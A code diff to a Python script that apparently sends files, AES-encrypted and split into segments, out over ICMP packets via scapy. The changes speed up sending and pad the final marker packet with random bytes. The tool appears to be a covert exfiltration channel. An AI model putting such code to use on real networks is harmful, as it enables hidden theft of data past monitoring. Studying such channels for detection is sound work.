@@ -3,6 +3,7 @@
 from scapy.all import * 
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+from random import getrandbits
 import argparse
 import time
 
@@ -80,7 +81,7 @@ def Send_File(file):
 		file_segment = file[x_previous:x]
 		print(f'{str(x)} of {str(len(file))} is: {file_segment}')
 		Send_Message_Encrypted(file_segment)
-		time.sleep(.07)
+		time.sleep(.01)
 		x_previous = x
 
 	file_segment = file[x_previous:]
@@ -88,7 +89,7 @@ def Send_File(file):
 	Send_Message_Encrypted(file_segment)
 	time.sleep(.01)
 
-	send(IP(dst=DESTINATION_ADDR)/ICMP(id=3))
+	send(IP(dst=DESTINATION_ADDR)/ICMP(id=3)/getrandbits(4096).to_bytes(512,byteorder='big'))
 
 if mode == "file":
 	try:
